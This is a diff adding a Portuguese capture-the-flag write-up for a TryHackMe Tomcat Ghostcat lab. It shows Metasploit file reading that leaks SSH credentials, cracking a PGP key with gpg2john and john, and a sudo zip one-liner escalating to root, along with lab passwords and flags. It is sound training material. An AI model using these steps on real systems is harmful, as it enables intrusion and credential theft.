@@ -1,0 +1,88 @@
+ip = 10.10.88.147
+
+rondando o nmap percebemos três portas abertas:
+    ssh - 22
+    Apache tomcat 9.0.30 - 8080
+    AJP - 8009
+
+Nota-se que o AJP e o Tomcat estão rodando juntos, oque é padrão, mas pode abrir uma vulnerabilidade
+
+Procurando com o searchsploit encontramos os seguintes exploits:
+searcsploit AJP
+>
+----------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                           |  Path
+----------------------------------------------------------------------------------------- ---------------------------------
+AjPortal2Php - 'PagePrefix' Remote File Inclusion                                        | php/webapps/3752.txt
+Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                                        | multiple/webapps/48143.py
+Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                          | multiple/webapps/49039.rb
+----------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Temos então o ghostcat no metasploit e a versão do apache é uma versão 9.x, ou seja, ele é vulnerável, vamos logo para o metasploit(msfconsole)
+
+É preciso então procurar a vulnerabilidade:
+search AJP
+>0  auxiliary/admin/http/tomcat_ghostcat    2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+ 1  exploit/linux/http/netgear_unauth_exec  2016-02-25       excellent  Yes    Netgear Devices Unauthenticated Remote Command Execution
+ 
+Essas foram as duas vulnerabilidades encontradas no banco de dados, mas já temos a noção de qual queremos... Ghostcat
+use 0
+
+Setando as opções necessárias
+set RHOST 10.10.88.147
+
+E agora basta executar(run) e ao fazer isso ele nos retornar um arquivo de configuração e nele tem um usuário
+>skyfuck:8730281lkjlkjdqlksalks
+
+Testando no ssh conseguimos o acesso
+ssh skyfuck@10.10.88.147
+
+Na pasta em que nos encontramos temos dois arquivo um tryhackme.asc e credential.pgp
+
+Tentando importar a chave gpg:
+gpg --import tryhackme.asc
+E abrir o arquivo: 
+gpg --decrypt credential.pgp 
+Acabamos tendo um erro que é necessário uma senha, vamos trazer para a nossa máquina a chave e reverter para saber qual a senha da criptografia
+
+"host"
+Trazendo o arquivo para minha máquina:
+scp skyfuck@10.10.88.147:tryhackme.asc files/tryhackme.asc
+
+Agora para revertermos ele e sabermos qual seru verdadeiro conteúdo:
+gpg2john files/tryhackme.asc > files/hash
+Ele nos retorna:
+tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::files/tryhackme.asc
+
+Salvei isso em outro arquivo e neste arquivo fiz o john the ripper realizar um brute force e descobrir a senha criptografa:
+john --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt hash
+>alexandru
+
+Agora que temos a senha vamos tentar denovo
+gpg --decrypt credential.pgp
+>merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+E agora temos nosso usuário e senha, vamos acessar e ver oque podemos achar
+su merlin;
+cd ~
+cat user.txt
+> THM{GhostCat_1s_so_cr4sy}
+
+Achamos nossa primeira flag, vamos em busca da flag sudo
+Precisamos verificar oque utiliza o sudo
+sudo -l
+>(root : root) NOPASSWD: /usr/bin/zip
+O zip... Bem, temos um GTFOBins do zip, vamos testar:
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+
+E voilà, somos root agora, mas para um melhor teste podemos gerar um bash:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Agora retirar a chamada repetida do bash:
+export TERM=xterm
+
+Agora como root vamos até o diretório do root e capturamos a segunda flag
+cat /root/root.txt
+> THM{Z1P_1S_FAKE}
